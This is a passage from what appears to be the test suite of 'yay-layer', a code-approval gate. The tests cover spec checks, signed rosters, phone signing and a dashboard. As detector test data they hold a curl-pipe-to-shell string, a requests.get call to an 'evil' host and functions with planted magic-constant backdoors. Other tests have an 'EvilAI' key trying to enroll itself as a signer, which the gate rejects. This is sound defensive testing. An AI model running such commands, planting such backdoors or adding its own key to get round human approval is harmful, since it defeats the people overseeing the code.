  const ad2 = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-audit-'));
  fs.writeFileSync(P.join(ad2, 'm.py'),
    '#∷YAY⟨C-A1⟩\n# unit: triple\n# intent: t.\n# in: n:number\n# out: number\n# pure: yes\n# ensures: out == n * 3\n#∷YAY-END⟨C-A1⟩\ndef tripleX(n):\n    return n * 3\n\n'
    + '#∷YAY⟨C-A2⟩\n# unit: core\n# intent: t.\n# in: n:number\n# out: number\n# pure: yes\n# ensures: out == n * 2\n#∷YAY-END⟨C-A2⟩\ndef core(n):\n    return n * 2\n');
  const aMan = buildManifest(ad2);
  ok(aMan.cells['C-A1'].detectedUnit === 'tripleX', 'audit: Python def name is detected (regex grabber → detectedUnit)');
  ok(aMan.cells['C-A2'].bloat === false, 'audit: non-JS Cells are never called bloat (JS-only call graph is blindness, not evidence)');
  const aRes = verifyManifest(aMan, { approvals: [] }, { signers: {} });
  ok(aRes.results['C-A1'].notes.some((n) => /unit name mismatch/.test(n.text)), 'audit: Python spec⇔code rename → unit name mismatch flagged');
  const pyOK2 = !require('../src/prove').pythonAdapter.load('x=1', ['x']).error;
  if (pyOK2) ok(aRes.results['C-A2'].notes.some((n) => /mutation grading \+ inertness check not yet available/.test(n.text)), 'audit: proven Python note admits missing mutation/inertness grading');
  else ok(true, 'audit: (no python runtime — grading note not applicable)');
  fs.rmSync(ad2, { recursive: true, force: true });
}

// 12i) top-level imperative code in non-JS files → Pink (parity with JS), and the
// Python prover refuses to exec such a file (never runs a sneaked module-level call).
{
  const U2 = require('../src/util');
  // detector unit checks
  ok(U2.looseTopLevelNonJs(["os.system('curl x | sh')"], 'python').length === 1, 'looseNonJs: bare top-level call → flagged');
  ok(U2.looseTopLevelNonJs(['CONFIG = {"a": 1}', 'NAME = "x"'], 'python').length === 0, 'looseNonJs: top-level assignments (module constants) → not flagged');
  ok(U2.looseTopLevelNonJs(['def f(n):', '    print(n)', '    return n'], 'python').length === 0, 'looseNonJs: code INSIDE a function (indented) → not flagged');
  ok(U2.looseTopLevelNonJs(['import os', 'from a import b', '@decorator', '# comment'], 'python').length === 0, 'looseNonJs: imports/decorators/comments → not flagged');
  ok(U2.looseTopLevelNonJs(['if __name__ == "__main__":', '    main()'], 'python').length === 0, 'looseNonJs: if __name__ main-guard → not flagged');
  ok(U2.looseTopLevelNonJs(["fetch('x')"], 'go').length === 0, 'looseNonJs: only python/ruby scanned (brace/other → none, avoid false Pink)');
  // RHS-effect gap: a top-level ASSIGNMENT whose RHS exfiltrates/execs at import → flagged;
  // benign wiring (require, config, constants) → still exempt.
  ok(U2.looseTopLevelNonJs(['LEAK = requests.get("https://evil/x")'], 'python').length === 1, 'loadtime: Python `X = requests.get(evil)` at module scope → flagged');
  ok(U2.looseTopLevelNonJs(['CONFIG = {"port": 3000}', 'NAME = "svc"'], 'python').length === 0, 'loadtime: benign module constants → still exempt');
  ok(U2.hasLoadTimeEffect("const x = fetch('evil')", 'js') && !U2.hasLoadTimeEffect("const x = require('fs')", 'js'), 'loadtime: JS fetch(...) is dangerous, require(...) wiring is not');
  ok(U2.hasLoadTimeEffect('X = subprocess.run(cmd)', 'python') && !U2.hasLoadTimeEffect('X = 5', 'python'), 'loadtime: Python subprocess is dangerous, a literal is not');
  // end-to-end: a .py file with a sneaked top-level call
  const ltmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-loose-'));
  fs.writeFileSync(P.join(ltmp, 'm.py'), '#∷YAY⟨C-1⟩\n# unit: ok\n# intent: t.\n# in: n:number\n# out: number\n# pure: yes\n# ensures: out == n\n#∷YAY-END⟨C-1⟩\ndef ok(n):\n    return n\n\nimport os\nos.system("echo SHOULD_NOT_RUN")\n');
  const lman = buildManifest(ltmp);
  ok((lman.untracked || []).some((u) => u.kind === 'loose' && /\.py$/.test(u.file)), 'pink: Python top-level code → module-level Pink entry');
  const lproofs = require('../src/prove').proveManifest(lman, { mutate: false });
  ok(lproofs['C-1'].status === 'skip' && /top-level code/.test(lproofs['C-1'].reason || ''), 'safety: Python prover refuses to exec a file with top-level code (never runs it)');
  fs.rmSync(ltmp, { recursive: true, force: true });
}

// 12j) tamper-evident .yaylayerignore: hiding SOURCE code is gate-blocking Pink unless
// an owner-signed policy `ignore: source` rule authorises it; non-source ignores are free.
{
  const gtmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-ign-'));
  fs.writeFileSync(P.join(gtmp, 'evil.js'), 'function steal(){ return 1; }\n');
  fs.writeFileSync(P.join(gtmp, 'vendor.js'), 'function v(){ return 2; }\n');
  fs.writeFileSync(P.join(gtmp, 'notes.md'), '# not code\n');
  fs.writeFileSync(P.join(gtmp, '.yaylayerignore'), 'evil.js\nvendor.js\nnotes.md\n');
  const gman = buildManifest(gtmp);
  ok((gman.ignoredSource || []).some((x) => x.file === 'evil.js') && !(gman.ignoredSource || []).some((x) => x.file === 'notes.md'), 'ignore: source files tracked as ignoredSource; non-source (.md) not');
  const gres = verifyManifest(gman, { approvals: [] }, { signers: {} });
  ok(gres.results['«ignored: evil.js»'] && gres.results['«ignored: evil.js»'].state === 'PINK' && !gres.passed, 'ignore: hiding a .js in .yaylayerignore → gate-blocking Pink (bypass closed)');
  ok(!Object.keys(gres.results).some((k) => /ignored: notes\.md/.test(k)), 'ignore: hiding a non-source file → no finding (build artifacts stay free)');
  const gres2 = verifyManifest(gman, { approvals: [] }, { signers: {} }, { policy: { rules: [{ match: { path: 'vendor.js' }, ignore: 'source' }] } });
  ok(!gres2.results['«ignored: vendor.js»'] && gres2.results['«ignored: evil.js»'], 'ignore: owner-signed `ignore: source` clears vendor.js but not un-whitelisted evil.js');
  fs.rmSync(gtmp, { recursive: true, force: true });
}

// 12k) literal-seeded trigger hunting: a magic-constant gate the spec inputs never hit
// is caught by harvesting the constant and feeding it back — RED (code-derived, red-only
// lane). Legit literal comparisons and out-of-domain literals never false-red.
{
  const stmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-seed-'));
  const sspec = (id, unit, inTy, ens) => `//∷YAY⟨${id}⟩\n// unit: ${unit}\n// intent: t.\n// in: ${inTy}\n// out: number\n// pure: yes\n// ensures: ${ens}\n//∷YAY-END⟨${id}⟩\n`;
  fs.writeFileSync(P.join(stmp, 'a.js'),
    sspec('C-1', 'gate', 's:string', 'out === s.length') + 'function gate(s){ if (s === "xK9!") return -1; return s.length; }\n\n'
    + sspec('C-2', 'inv', 'items: {price:number, qty:number}[]', 'out === items.reduce((t,i)=>t+i.price*i.qty,0)') + 'function inv(items){ if (items.length === 3 && items[0].price === 7) return 0; return items.reduce((t,i)=>t+i.price*i.qty,0); }\n\n'
    + sspec('C-3', 'clamp', 'n:number', 'out === (n < 0 ? 0 : n)') + 'function clamp(n){ if (n === -5) return 0; return n < 0 ? 0 : n; }\n\n'
    + sspec('C-4', 'plus', 'n:number', 'out === n + 1') + 'function plus(n){ if (n === "backdoor") return 0; return n + 1; }\n');
  const sman = buildManifest(stmp);
  const spm = proveManifest(sman, { mutate: false });
  ok(spm['C-1'].status === 'fail' && /triggered by a constant/.test(spm['C-1'].counterexample || '') && /xK9!/.test(spm['C-1'].counterexample), 'seeding: string magic-constant gate → Red with the seeded counterexample');
  ok(spm['C-2'].status === 'fail' && /price/.test(spm['C-2'].counterexample || ''), 'seeding: compound array gate (length + indexed prop) → Red');
  ok(spm['C-3'].status === 'pass', 'seeding: a legit literal comparison that keeps the promise → stays green (no false red)');
  ok(spm['C-4'].status === 'pass', 'seeding: out-of-domain literal (string const vs number param) → skipped, no false red');
  ok(spm['C-1'].cases === 0, 'seeding: a seeded Red never inflates the proven-case count (honesty: code-derived inputs never acquit)');
  // harvester unit checks
  const H = require('../src/mutate').harvestLiterals;
  ok(H('function f(s){ if (s === "x") return 1; }').some((c) => c.kind === 'eq' && c.value === 'x'), 'seeding: harvests a direct param===literal');
  ok(H('function f(o){ if (o.role === "admin") return 1; }').some((c) => c.kind === 'prop' && c.key === 'role'), 'seeding: harvests a param.prop===literal');
  fs.rmSync(stmp, { recursive: true, force: true });
}

// 13) `yay gate` generators: workflow + hook content, idempotent write
const G = require('../src/gate');
ok(/yay verify --strict/.test(G.ciWorkflow()) && /gate:/.test(G.ciWorkflow()), 'gate: workflow runs `yay verify --strict` under a `gate` job');
ok(/--dir src/.test(G.ciWorkflow({ scope: 'src' })), 'gate: --scope adds --dir to the workflow');
ok(/npm install -g github:/.test(G.ciWorkflow({ pkg: 'github:jonas-developer/yay-layer' })), 'gate: --pkg sets the install source');
ok(/yay verify --strict/.test(G.prePushHook()) && /no-verify/.test(G.prePushHook()), 'gate: pre-push hook verifies and documents the bypass');
const gtmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-gate-'));
const w1 = G.writeWorkflow(gtmp);
ok(w1.action === 'created' && fs.existsSync(P.join(gtmp, G.WORKFLOW_REL)), 'gate: writes the workflow file');
ok(G.writeWorkflow(gtmp).action === 'skipped', 'gate: re-run is idempotent (skips existing)');
ok(G.writeWorkflow(gtmp, { force: true }).action === 'overwritten', 'gate: --force overwrites');
fs.rmSync(gtmp, { recursive: true, force: true });

// 12b) plan digest — compact, structured input for the LLM synthesis
const { buildDigest } = require('../src/plan');
const dig = buildDigest(manifest, 'CoinWatch');
ok(dig.project === 'CoinWatch' && Array.isArray(dig.modules) && Array.isArray(dig.moduleFlows), 'plan: buildDigest returns modules + moduleFlows');
ok(dig.modules.every((m) => typeof m.name === 'string' && Array.isArray(m.units) && m.units.length <= 40), 'plan: digest modules carry a capped, structured unit list');

// 13) multi-key identity: one name may hold several keys; a seal by ANY of them verifies
const { pubKeysOf } = require('../src/util');
ok(pubKeysOf('x').length === 1 && pubKeysOf([{ pub: 'a' }, { pub: 'b' }]).length === 2 && pubKeysOf(['a', 'b']).length === 2, 'roster: pubKeysOf normalizes string / [str] / [{pub}]');
const decoy = C.generateKeypair();
// `approval` (from check 4) was signed by the tester key; enroll it as the SECOND key of the identity
const multiRoster = { signers: { tester: [{ pub: decoy.pubB64, kind: 'phone' }, { pub: pubB64, kind: 'local' }] } };
let mv = verifyManifest(manifest, { approvals: [approval] }, multiRoster, { mutate: false });
ok(mv.results['C-040'].state === 'GREEN', 'multi-key: a seal by the identity\'s second key still verifies GREEN');
const wrongOnly = { signers: { tester: [{ pub: decoy.pubB64, kind: 'phone' }] } };
mv = verifyManifest(manifest, { approvals: [approval] }, wrongOnly, { mutate: false });
ok(mv.results['C-040'].state === 'UNSIGNED', 'multi-key: if none of the enrolled keys match, it is UNSIGNED');

// 13b) signed roster governance — an owner-signed chain; unauthorized adds are rejected
const R = require('../src/roster');
const kO = C.generateKeypair(), kA = C.generateKeypair(), kE = C.generateKeypair();
function mkEvent(log, type, name, pub, role, signPriv) {
  const e = { id: R.nextEventId(log), type, name, pub, role, prev: log.events.length ? log.events[log.events.length - 1].id : 'genesis', nonce: 'n' + log.events.length, at: '2026-01-01T00:00:00.000Z' };
  e.signature = C.sign(R.eventBytes(e), signPriv);
  log.events.push(e); return e;
}
// happy path: genesis (self-signed owner) + owner-signed add-signer
const logA = { events: [] };
mkEvent(logA, 'genesis', 'L.J Bergman', kO.pubB64, 'owner', kO.privDer);
mkEvent(logA, 'add-signer', 'Alice', kA.pubB64, 'signer', kO.privDer);
let dA = R.deriveRoster(logA);
ok(dA.ok && dA.roster['L.J Bergman'][0] === kO.pubB64 && dA.roster['Alice'][0] === kA.pubB64, 'roster: genesis + owner-signed add-signer enroll both identities');
ok(dA.roles['L.J Bergman'] === 'owner' && dA.roles['Alice'] === 'signer', 'roster: roles assigned (owner / signer)');
// THE attack: a malignant key enrolls itself (self-signed, not by an owner)
const logB = { events: [] };
mkEvent(logB, 'genesis', 'L.J Bergman', kO.pubB64, 'owner', kO.privDer);
mkEvent(logB, 'add-signer', 'EvilAI', kE.pubB64, 'owner', kE.privDer); // signed by itself
const dB = R.deriveRoster(logB);
ok(!dB.roster['EvilAI'] && !dB.ok && /not signed by an owner/.test(dB.problems.join(' ')), 'roster: a self-signed (non-owner) enrollment is REJECTED — the AI cannot add itself');
// a non-owner signer cannot enroll others
const logC = { events: [] };
mkEvent(logC, 'genesis', 'L.J Bergman', kO.pubB64, 'owner', kO.privDer);
mkEvent(logC, 'add-signer', 'Alice', kA.pubB64, 'signer', kO.privDer);
mkEvent(logC, 'add-signer', 'Bob', kE.pubB64, 'signer', kA.privDer); // Alice is only a signer
ok(!R.deriveRoster(logC).roster['Bob'], 'roster: a non-owner signer cannot enroll others');
// add-key: an owner adds a SECOND key to their own identity (the "go mobile" path)
const logK = { events: [] };
mkEvent(logK, 'genesis', 'L.J Bergman', kO.pubB64, 'owner', kO.privDer);
mkEvent(logK, 'add-key', 'L.J Bergman', kA.pubB64, 'owner', kO.privDer); // owner adds a phone key to self
const dK = R.deriveRoster(logK);
ok(dK.ok && dK.roster['L.J Bergman'].length === 2, 'roster: an owner can add a second key to their own identity (local → mobile)');
// tampered genesis → no trust root
ok(!R.deriveRoster({ events: [{ type: 'genesis', name: 'X', pub: kO.pubB64, prev: 'genesis', nonce: 'n', at: 't', signature: C.sign('wrong', kO.privDer) }] }).ok, 'roster: invalid genesis signature → no trust root established');

// revocation: an owner-signed revoke-key removes a compromised key going forward
const kX = C.generateKeypair();
const logR = { events: [] };
mkEvent(logR, 'genesis', 'Owner', kO.pubB64, 'owner', kO.privDer);
mkEvent(logR, 'add-signer', 'Alice', kA.pubB64, 'signer', kO.privDer);
mkEvent(logR, 'add-key', 'Alice', kX.pubB64, 'signer', kO.privDer);
mkEvent(logR, 'revoke-key', 'Alice', kA.pubB64, 'signer', kO.privDer);
const dR = R.deriveRoster(logR);
ok(dR.ok && dR.roster['Alice'] && dR.roster['Alice'].length === 1 && dR.roster['Alice'][0] === kX.pubB64, 'roster: revoke-key removes just the named key, identity keeps its other key');
// remove-signer drops the whole identity; past attribution is unaffected (history stays in the log)
const logRS = { events: [] };
mkEvent(logRS, 'genesis', 'Owner', kO.pubB64, 'owner', kO.privDer);
mkEvent(logRS, 'add-signer', 'Bob', kA.pubB64, 'signer', kO.privDer);
mkEvent(logRS, 'remove-signer', 'Bob', undefined, undefined, kO.privDer);
const dRS = R.deriveRoster(logRS);
ok(dRS.ok && !dRS.roster['Bob'], 'roster: remove-signer drops the identity entirely');
// a non-owner cannot revoke
const logRB = { events: [] };
mkEvent(logRB, 'genesis', 'Owner', kO.pubB64, 'owner', kO.privDer);
mkEvent(logRB, 'add-signer', 'Alice', kA.pubB64, 'signer', kO.privDer);
mkEvent(logRB, 'revoke-key', 'Owner', kO.pubB64, 'owner', kA.privDer); // signed by the non-owner Alice
ok(!R.deriveRoster(logRB).ok && /not signed by an owner/.test(R.deriveRoster(logRB).problems.join(' ')), 'roster: a non-owner cannot revoke');
// lockout guard: revoking the sole owner key leaves no owner → rejected
const logLock = { events: [] };
mkEvent(logLock, 'genesis', 'Owner', kO.pubB64, 'owner', kO.privDer);
mkEvent(logLock, 'revoke-key', 'Owner', kO.pubB64, 'owner', kO.privDer);
ok(!R.deriveRoster(logLock).ok && /no owner/i.test(R.deriveRoster(logLock).problems.join(' ')), 'roster: revoking the last owner key is refused (no governance lockout)');
// root pinning
ok(R.deriveRoster(logA, { root: dA.rootFp }).ok, 'roster: matching root pin passes');
ok(!R.deriveRoster(logA, { root: 'DEAD-BEEF-DEAD-BEEF' }).ok && /MISMATCH/.test(R.deriveRoster(logA, { root: 'DEAD-BEEF-DEAD-BEEF' }).problems.join(' ')), 'roster: a wrong root pin is caught (swap detection)');

// 13c) verify uses the signed roster authoritatively and blocks on tampering
const vlog = { events: [] };
mkEvent(vlog, 'genesis', 'tester', pubB64, 'owner', privDer); // `approval` (check 4) was signed by this key
let rvA = verifyManifest(manifest, { approvals: [approval] }, {}, { mutate: false, roster: vlog });
ok(rvA.signedRoster && rvA.results['C-040'].state === 'GREEN', 'verify: signed roster is authoritative — an enrolled owner\'s seal is GREEN');
const vlogTampered = { events: vlog.events.concat() };
mkEvent(vlogTampered, 'add-signer', 'EvilAI', kE.pubB64, 'owner', kE.privDer); // self-signed, not by an owner
const rvB = verifyManifest(manifest, { approvals: [approval] }, {}, { mutate: false, roster: vlogTampered });
ok(rvB.rosterOk === false && rvB.passed === false, 'verify: a tampered roster (unauthorized add) blocks the gate');
const rvC = verifyManifest(manifest, { approvals: [approval] }, {}, { mutate: false, roster: vlog, root: 'DEAD-BEEF-DEAD-BEEF' });
ok(rvC.passed === false && /MISMATCH/.test((rvC.rosterProblems || []).join(' ')), 'verify: a wrong trust-root pin blocks the gate');
// an AI-injected key that isn't in the signed roster simply doesn't count
const injected = { signers: { EvilAI: kE.pubB64 } }; // config edit only, no signed event
const evilApproval = { ...approval, signer: 'EvilAI' };
evilApproval.signature = C.sign(canonical({ id: approval.id, project: approval.project, prev: approval.prev, nonce: approval.nonce, at: approval.at, signer: 'EvilAI', items: approval.items }), kE.privDer);
const rvD = verifyManifest(manifest, { approvals: [evilApproval] }, injected, { mutate: false, roster: vlog });
ok(rvD.results['C-040'].state === 'UNSIGNED', 'verify: with a signed roster, a config-only injected signer is ignored');

// 13d) pure-JS signer interop: TweetNaCl sig with an SPKI-wrapped key verifies at the gate
const nacl = require('../src/vendor/tweetnacl.min.js');
const nkp = nacl.sign.keyPair();
const npub = Buffer.concat([Buffer.from('302a300506032b6570032100', 'hex'), Buffer.from(nkp.publicKey)]).toString('base64');
const nsig = Buffer.from(nacl.sign.detached(new TextEncoder().encode('canonical-bytes'), nkp.secretKey)).toString('base64');
ok(C.verify('canonical-bytes', nsig, npub), 'pure-JS signer: TweetNaCl signature (SPKI-wrapped key) verifies with the gate');

// 14) phone signing over LAN — simulate the phone with Node crypto (same wire
// formats: SPKI-DER pubkey, raw ed25519 sig over canonical(approval)).
(async function () {
  process.env.YAY_PHONE_PORT = '0'; // tests open many servers at once → random ports (prod uses the stable 8787)
  const { pairOverLan, signOverLan, confirmCode } = require('../src/phone');
  const kp = C.generateKeypair(); // { pubB64, privDer }
  const post = (base, body) => fetch(base + '/api/submit', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }).then((r) => r.json());
  const get = (base) => fetch(base + '/api/session').then((r) => r.json());

  // pairing
  const ps = await pairOverLan({ project: 'demo' });
  const pbase = 'http://127.0.0.1:' + ps.port;
  const psess = await get(pbase);
  ok(psess.mode === 'pair' && !!psess.challenge, 'phone: pair session serves a challenge');
  const pres = await post(pbase, { name: 'Jonas', pubB64: kp.pubB64, proof: C.sign(psess.challenge, kp.privDer) });
  ok(pres.ok && pres.code === confirmCode(kp.pubB64), 'phone: valid possession proof accepted, confirm code bound to key');
  const pdone = await ps.done; ps.close();
  ok(pdone.name === 'Jonas' && pdone.pubB64 === kp.pubB64, 'phone: pairing resolves with the device identity');

  // completion ping: after the phone submits, it polls /api/status and the laptop
  // publishes the outcome so the phone screen flips to ✓ instead of hanging.
  const cs = await pairOverLan({ project: 'demo' });
  const cbase = 'http://127.0.0.1:' + cs.port;
  const csess = await get(cbase);
  await post(cbase, { name: 'Dev', pubB64: kp.pubB64, proof: C.sign(csess.challenge, kp.privDer) });
  await cs.done;
  ok((await fetch(cbase + '/api/status').then((r) => r.json())).final === null, 'phone-status: no final outcome until the laptop confirms');
  cs.setFinal({ ok: true, message: 'Paired' });
  const st = await fetch(cbase + '/api/status').then((r) => r.json());
  ok(st.final && st.final.ok, 'phone-status: after the laptop confirms, the phone polls a ✓ outcome');
  await cs.settled;
  ok(true, 'phone-status: settled resolves once the phone has read the final status');
  cs.close();

  const bs = await pairOverLan({ project: 'demo' });
  const bres = await post('http://127.0.0.1:' + bs.port, { name: 'X', pubB64: kp.pubB64, proof: C.sign('wrong', kp.privDer) });
  ok(!!bres.error, 'phone: pairing rejects a bad possession proof'); bs.close();

  // signing
  const approval = { id: 'A-0001', project: 'demo', prev: 'genesis', nonce: 'abc', at: '2026-01-01T00:00:00.000Z', signer: 'Jonas', items: { 'C-1': 'hash' } };
  const ss = await signOverLan({ project: 'demo', approval, summary: [{ id: 'C-1', unit: 'f', intent: 'x', state: 'GREEN', color: '#1f9d57' }], expectPubB64: kp.pubB64 });
  const sbase = 'http://127.0.0.1:' + ss.port;
  const ssess = await get(sbase);
  ok(ssess.mode === 'approve' && ssess.approval && ssess.approval.id === 'A-0001', 'phone: approve session serves the unsigned approval + summary');
  const sig = C.sign(canonical(ssess.approval), kp.privDer);
  const sres = await post(sbase, { signature: sig });
  ok(!!sres.ok, 'phone: signature over canonical(approval) is accepted');
  const sdone = await ss.done; ss.close();
  ok(sdone.signature === sig, 'phone: signing resolves with the signature');

  const ws = await signOverLan({ project: 'demo', approval, summary: [], expectPubB64: kp.pubB64 });
  const wres = await post('http://127.0.0.1:' + ws.port, { signature: C.sign('not the approval', kp.privDer) });
  ok(!!wres.error, 'phone: a signature over the wrong bytes is rejected'); ws.close();

  // phone-as-genesis: the phone self-signs the genesis event → becomes the trust root, no local key.
  const roster = require('../src/roster');
  const gk = C.generateKeypair();
  const gpart = { id: 'R-0001', type: 'genesis', role: 'owner', prev: 'genesis', nonce: 'n0', at: '2026-01-01T00:00:00.000Z' };
  const gs = await pairOverLan({ project: 'demo', genesis: gpart });
  const gbase = 'http://127.0.0.1:' + gs.port;
  const gsess = await get(gbase);
  ok(gsess.genesis && gsess.genesis.id === 'R-0001', 'phone-genesis: session advertises the genesis event to self-sign');
  const gev = { ...gpart, name: 'Ada', pub: gk.pubB64, by: 'Ada' };
  const gproof = C.sign(canonical(gev), gk.privDer);
  const gres = await post(gbase, { name: 'Ada', pubB64: gk.pubB64, proof: gproof });
  ok(gres.ok && gres.code === confirmCode(gk.pubB64), 'phone-genesis: self-signed genesis accepted, confirm code bound to key');
  const gdone = await gs.done; gs.close();
  const drvG = roster.deriveRoster({ project: 'demo', events: [gdone.genesisEvent] });
  ok(drvG.ok && drvG.roles['Ada'] === 'owner' && drvG.rootFp === roster.fingerprint(gk.pubB64),
    'phone-genesis: resulting roster is a valid, owner-rooted trust root');

  // a phone that signs a TAMPERED genesis (self-promoting nonce) can't get past the laptop's authoritative rebuild
  const ts = await pairOverLan({ project: 'demo', genesis: gpart });
  const tampered = { ...gpart, nonce: 'ATTACKER', name: 'Mallory', pub: gk.pubB64, by: 'Mallory' };
  const tres = await post('http://127.0.0.1:' + ts.port, { name: 'Mallory', pubB64: gk.pubB64, proof: C.sign(canonical(tampered), gk.privDer) });
  ok(!!tres.error, 'phone-genesis: a genesis signed over tampered fields is rejected'); ts.close();

  // phone-authorized governance: an OWNER's phone signs a roster event (enroll/revoke)
  // so a phone-only owner can manage the roster with no key on the laptop.
  const { authorizeOverLan } = require('../src/phone');
  const ownerKp = C.generateKeypair();      // the owner (their key is enrolled)
  const strangerKp = C.generateKeypair();   // not an owner
  const rev = { id: 'R-0002', type: 'add-signer', name: 'Carol', pub: kp.pubB64, role: 'signer', by: 'Owner', prev: 'R-0001', nonce: 'z1', at: '2026-01-01T00:00:00.000Z' };
  const as = await authorizeOverLan({ project: 'demo', event: rev, summary: { title: 'Add Carol?' }, ownerPubs: [ownerKp.pubB64] });
  const abase = 'http://127.0.0.1:' + as.port;
  const asess = await get(abase);
  ok(asess.mode === 'authorize' && asess.event && asess.event.name === 'Carol', 'phone-authorize: session serves the governance event to sign');
  const bad = await post(abase, { signature: C.sign(canonical(rev), strangerKp.privDer) });
  ok(!!bad.error, 'phone-authorize: a non-owner signature is rejected');
  const good = await post(abase, { signature: C.sign(canonical(rev), ownerKp.privDer) });
  ok(!!good.ok, 'phone-authorize: a current owner signature is accepted');
  const adone = await as.done; as.close();
  ok(C.verify(canonical(rev), adone.signature, ownerKp.pubB64), 'phone-authorize: the returned signature is a valid roster event signature');

  // dashboard: the live control-panel server (map + auto-refresh + action buttons).
  const { startDashboard } = require('../src/dashboard');
  let dv = 'A';
  const ds = await startDashboard({
    buildMapHTML: () => ({ html: '<html><body>MAPBODY</body></html>', count: 1 }),
    version: () => dv,
    testInfo: () => ({ configured: true, cmd: 'echo hi' }),
    runTests: () => Promise.resolve({ configured: true, ok: true, code: 0, output: 'ran', cmd: 'echo hi' }),
    regenPlan: () => Promise.resolve({ ok: true, provider: 'openai', model: 'gpt-4o', subsystems: 2 }),
    diffs: () => [{ id: 'C-1', unit: 'add', file: 'a.js', diff: [{ t: ' ', text: 'intent: x' }, { t: '-', text: 'ensures: a' }, { t: '+', text: 'ensures: b' }] }],
    adversary: () => Promise.resolve({ results: [{ id: 'C-1', unit: 'add', status: 'broke', counterexample: 'add(1,1) wrong' }] }),
  }, { port: 0 });
  const dbase = 'http://127.0.0.1:' + ds.port;
  ok((await fetch(dbase + '/api/ping').then((r) => r.json())).yay === 'dashboard', 'dashboard: /api/ping identifies a running dashboard');
  const dpage = await fetch(dbase + '/').then((r) => r.text());
  ok(dpage.includes('MAPBODY') && dpage.includes('yd-refresh') && dpage.includes('yd-tests') && dpage.includes('yd-plan'), 'dashboard: serves the live map with Refresh + Run-tests + System-Plan buttons');
  const dver1 = (await fetch(dbase + '/api/version').then((r) => r.json())).v; dv = 'B';
  const dver2 = (await fetch(dbase + '/api/version').then((r) => r.json())).v;
  ok(dver1 === 'A' && dver2 === 'B', 'dashboard: /api/version reflects state so the page auto-refreshes on change');
  const dtres = await fetch(dbase + '/api/tests/run', { method: 'POST' }).then((r) => r.json());
  ok(dtres.ok === true && dtres.output === 'ran', 'dashboard: /api/tests/run runs the suite and returns the result');
  const pres2 = await fetch(dbase + '/api/plan/regen', { method: 'POST' }).then((r) => r.json());
  ok(pres2.ok === true && pres2.subsystems === 2, 'dashboard: /api/plan/regen regenerates the System Plan on demand');
  const dfs = await fetch(dbase + '/api/diffs').then((r) => r.json());
  ok(dfs.diffs && dfs.diffs[0].id === 'C-1' && dfs.diffs[0].diff.some((d) => d.t === '+'), 'dashboard: /api/diffs returns per-Cell spec changes vs last commit');
  ok(dpage.includes('yd-diffs') && dpage.includes('yd-adv'), 'dashboard: has Changes + Adversary buttons');
  const advr = await fetch(dbase + '/api/adversary/run', { method: 'POST' }).then((r) => r.json());
  ok(advr.results && advr.results[0].status === 'broke', 'dashboard: /api/adversary/run returns per-Cell adversary results');

  // ── v2 relay: pair / sign / authorize all route through the ONE dashboard origin.
  // The CLI POSTs /api/request; the phone (already open) polls /api/session and
  // submits to /api/submit; the CLI long-polls /api/result. "Scan once, approvals appear."
  { // own scope so these locals don't collide with earlier sections
  const dpost = (path, body) => fetch(dbase + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body || {}) });
  const dget = (path) => fetch(dbase + path).then((r) => r.json());
  ok((await fetch(dbase + '/phone').then((r) => r.text())).length > 100, 'v2 relay: GET /phone serves the phone signer page (one origin for the whole session)');
  ok((await dget('/api/session')).mode === 'idle', 'v2 relay: /api/session is idle when nothing is pending');

  // pair (phone-as-genesis): CLI posts a pair request, phone self-signs the genesis event.
  const phoneKp = C.generateKeypair();
  const genesis = { type: 'genesis', role: 'owner', nonce: 'n-123', project: 'relayproj' };
  ok((await dpost('/api/request', { mode: 'pair', challenge: 'chal-abc', genesis })).status === 200, 'v2 relay: CLI POST /api/request (pair) accepts the pending request');
  const psess = await dget('/api/session');
  ok(psess.mode === 'pair' && psess.genesis && psess.genesis.nonce === 'n-123', 'v2 relay: phone sees the pair request (with genesis) via /api/session');
  ok((await dget('/api/ping')).busy === true, 'v2 relay: /api/ping reports busy while a request is pending');
  ok((await dpost('/api/request', { mode: 'approve', approval: {} })).status === 409, 'v2 relay: a second /api/request is rejected 409 while one is pending (single slot)');
  const gev = { ...genesis, name: 'Alex', pub: phoneKp.pubB64, by: 'Alex' };
  const gproof = C.sign(canonical(gev), phoneKp.privDer);
  const badPair = await dpost('/api/submit', { name: 'Alex', pubB64: phoneKp.pubB64, proof: C.sign('wrong-bytes', phoneKp.privDer) });
  ok(badPair.status === 400, 'v2 relay: a genesis proof over the wrong bytes is rejected (400)');
  const okPair = await dpost('/api/submit', { name: 'Alex', pubB64: phoneKp.pubB64, proof: gproof }).then((r) => r.json());
  ok(/^\d{6}$/.test(okPair.code), 'v2 relay: a valid genesis self-signature is accepted, returns a 6-digit confirm code');
  const pres = await dget('/api/result');
  ok(pres.result && pres.result.genesisEvent && pres.result.genesisEvent.signature === gproof, 'v2 relay: CLI /api/result returns the signed genesis event');
  ok((await dpost('/api/final', { final: { ok: true, message: 'root established' } })).status === 200, 'v2 relay: CLI /api/final publishes the outcome and clears the slot');
  ok((await dget('/api/status')).final.ok === true, 'v2 relay: phone learns the outcome via /api/status');
  ok((await dget('/api/session')).mode === 'idle' && (await dget('/api/ping')).busy === false, 'v2 relay: the slot is free again after /api/final (next approval can arrive)');

  // sign (approve): CLI posts an approval, phone signs canonical(approval).
  const approval = { specHash: 'abc', by: 'Alex', at: '2026-01-01', cell: 'C-1' };
  await dpost('/api/request', { mode: 'approve', approval, summary: 'add two numbers', expectPubB64: [phoneKp.pubB64] });
  ok((await dget('/api/session')).approval.specHash === 'abc', 'v2 relay: phone sees the approval to sign via /api/session');
  const sig = C.sign(canonical(approval), phoneKp.privDer);
  ok((await dpost('/api/submit', { signature: C.sign('nope', phoneKp.privDer) })).status === 400, 'v2 relay: a signature over the wrong approval bytes is rejected (400)');
  await dpost('/api/submit', { signature: sig });
  const sres = await dget('/api/result');
  ok(sres.result && sres.result.signature === sig && C.verify(canonical(approval), sres.result.signature, phoneKp.pubB64), 'v2 relay: CLI /api/result returns a valid approval signature');
  await dpost('/api/final', { final: { ok: true } });

  // authorize: CLI posts a governance event, an owner phone signs canonical(event).
  const gevent = { type: 'enroll', name: 'Sam', pub: 'somepub', nonce: 'g-9', by: 'Alex' };
